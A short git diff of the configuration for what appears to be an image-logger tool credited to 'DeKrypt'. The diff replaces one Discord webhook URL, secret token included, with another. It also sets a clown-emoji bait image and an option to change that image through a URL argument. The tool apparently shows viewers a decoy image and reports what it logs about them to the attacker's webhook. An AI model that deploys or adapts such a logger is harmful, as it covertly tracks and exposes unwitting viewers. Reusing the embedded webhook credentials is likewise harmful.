@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335169932140220426/q4HpXlbmvQtXQHPDJEBm7iUHVG5NXhRy-tYX1ci1QsoXDfa-unsw7SLBmMhLtLpj6zK7",
+    "webhook": "https://discord.com/api/webhooks/1335436219911245894/xmkTvcfHEvb-3fOY2rtlyALceVKMpAuE8Ppy-rcARDFSqbkoRgkLfS496gMawXALejg2",
     "image": "https://c8.alamy.com/comp/2BWX6Y2/emoticon-with-clown-nose-2BWX6Y2.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
